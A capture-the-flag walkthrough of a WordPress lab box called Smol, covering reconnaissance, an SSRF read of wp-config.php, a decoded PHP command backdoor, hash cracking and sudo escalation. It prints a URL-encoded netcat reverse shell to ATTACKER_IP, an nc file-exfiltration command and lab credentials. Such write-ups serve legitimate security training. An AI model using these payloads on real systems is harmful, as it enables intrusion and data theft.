# SMOL CTF Walkthrough (Concise Steps)

## Phase 1: Initial Reconnaissance

**Add Host to Local DNS:**
The target's IP was mapped to its hostname for easier access:

```bash
echo "10.201.30.246 smol.thm" | sudo tee -a /etc/hosts
```

**Network Scan (Nmap):**
A network scan identified two open ports:

* Port 22: OpenSSH 8.2p1
* Port 80: Apache httpd 2.4.41

**Web Enumeration (WPScan):**
A WordPress-specific scan was run to find vulnerabilities:

```bash
wpscan --url http://www.smol.thm
```

This scan identified the `jsmol2wp` plugin, which has a known SSRF vulnerability (CVE-2018-20463).

---

## Phase 2: Gaining Initial Foothold (as www-data)

**Exploit SSRF to Read wp-config.php:**

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=./../wp-config.php
```

**Extract Database Credentials:**

* User: `wpuser`
* Password: `kbLSF2Vop#lw3rjDZ629*Z%G`

**Access WordPress Admin Panel:**
Logged into: `http://www.smol.thm/wp-admin` using the credentials above.

**Discover and Deobfuscate Backdoor:**
A post on the dashboard pointed to a backdoor in the Hello Dolly plugin. The obfuscated code was decoded:

```bash
echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXNOZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
```

This revealed a simple command execution backdoor:

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

**Establish Reverse Shell:**

Start a listener on the attacker machine:

```bash
nc -lvnp 1337
```

Trigger the backdoor via URL:

```
http://www.smol.thm/wp-admin/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%201337%20%3E%2Ftmp%2Ff
```

**Stabilize the Shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Phase 3: User Pivots

### Path to diego

**Access the Database:**

```bash
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G'
```

**Dump User Hashes:**

```sql
USE wordpress;
SELECT user_login, user_pass FROM wp_users;
```

**Crack the Hash:**

```bash
hashcat -m 400 hashes /usr/share/wordlists/rockyou.txt
```

* Cracked Password: `sandiegocalifornia`

**Switch User and Get Flag:**

```bash
su diego
cat ~/user.txt
```

---

### Path to think

**Find Exposed SSH Key:**
A readable SSH private key found in `/home/think/.ssh/id_rsa`.

**Log in as think:**

```bash
chmod 600 think_id_rsa
ssh -i think_id_rsa think@smol.thm
```

---

### Path to xavi

**Find Encrypted Archive:**
A password-protected file `wordpress.old.zip` was found in `/home/gege`.

**Crack the Archive:**

Transfer the file:

```bash
# On target
nc ATTACKER_IP 4444 < /home/gege/wordpress.old.zip

# On attacker
nc -lvnp 4444 > wordpress.old.zip
```

Extract a crackable hash:

```bash
zip2john wordpress.old.zip > zip_hash
```

Crack the hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
```

* Cracked Password: `hero_gege@hotmail.com`

**Extract New Credentials:**
Inside the archive, a wp-config.php contained:

* User: `xavi`
* Password: `Passwordxavia`

**Switch User:**

```bash
su xavi
```

---

## Phase 4: Final Escalation to Root

**Check Sudo Permissions:**

```bash
sudo -l
```

* Output `(ALL: ALL) ALL` → unrestricted root access

**Escalate to Root:**

```bash
sudo su
```

**Capture the Root Flag:**

```bash
cat /root/root.txt
```
